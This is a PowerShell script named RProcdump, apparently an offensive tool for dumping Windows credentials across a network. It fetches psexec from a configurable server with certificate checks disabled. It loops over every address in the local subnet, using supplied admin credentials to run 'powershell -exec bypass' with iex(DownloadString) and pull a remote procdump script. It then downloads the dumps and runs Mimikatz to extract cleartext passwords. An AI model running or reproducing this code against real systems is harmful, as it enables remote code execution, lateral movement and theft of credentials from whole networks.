<#
RPROCDUMP - Remote process dumping automation. 
Use it to dump remotely all windows credentials and extract clear text with Mimikatz offline
Help:
	Edit prameters in procdump.ps1 and run Rprocdump.ps1 with same parameters:
	example:
	RProcdump -server http://127.0.0.1 -login administrator -pass password123

 Author: @ThebenyGreen
  - EyesOpenSecurity
#>
param( 
	[string] $server ,
	[string] $login ,
	[string] $pass 
	)
Write-Host "RProcdump - @TheBenyGreen" -ForegroundColor DarkGreen;
Write-Host "Remote Windows credentials dump process automation. "
Write-Host "----------------------------------------------------"


	
#	[string] $server = "http://127.0.0.1"
#	[string] $login = "administrator"
#	[string] $pass =  "password123"
	
	Function PsexecDownload {
			$exists = "$env:userprofile\psexec.exe"
			If (Test-Path $exists){
			 Write-Verbose "Already present"
			} else {
			if($env:PROCESSOR_ARCHITECTURE -eq "x86")
			{$downloadURL = "$server/psx32.txt"}else{$downloadURL = "$server/psx64.txt"}
            [string] $FileOnDisk =  "$env:userprofile\log.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			(New-Object System.Net.WebClient).DownloadFile($downloadURL, $FileOnDisk)
			Rename-Item $FileOnDisk psexec.exe
			}
		}
	Function RProcdump { 
		[CmdletBinding()] param( 
		[string]$id
		)
		$cmdline = @"
iex((New-Object Net.WebClient).DownloadString("$server/procdump.ps1"))
"@
		PsexecDownload 
		$r = Test-Path "$env:userprofile\psexec.exe"
		if (Test-Path "$env:userprofile\psexec.exe") {
			$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
			$w = $ip.split('.')[0]
			$x = $ip.split('.')[1]
			$y = $ip.split('.')[2]
			$z = $ip.split('.')[3]
			$StartAddress = "$w.$x.$y"
			for($i = 1; $i -lt 254; $i++) {
				$ipAddress= "$StartAddress.$i"
				$Command = "$env:userprofile\psexec.exe \\$ipAddress -u $login -p $pass -h -d powershell -exec bypass $cmdline"
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invoke-Expression $CmdString
			}	
		}
	}

RProcdump $server $login $pass

Write-Host "If Dumps have been uploaded"
Write-Host "You can it manually : Open dump file with Mimikatz to retrieve the creds ->  mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords "
Write-Host "OR you can try it automately"
$a = Read-Host "Do you want to try it automately ? (y/n):"
if ($a -eq "y") {
	$dump = Read-Host "URL of zipped dump file to download (PC.zip) :"
	$URL = "$server/$dump"
	$File = "$env:userprofile\AppData\$dump"
	(New-Object System.Net.WebClient).DownloadFile($URL, $File)
	.\mimikatz.exe sekurlsa::minidump $dump
	.\mimikatz.exe sekurlsa::logonPasswords
	}
else { 
	Write-Host "Ok, you will do it manually with -> mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords "
	Write-Host "Download Mimikatz: https://github.com/gentilkiwi/mimikatz/releases"
	}

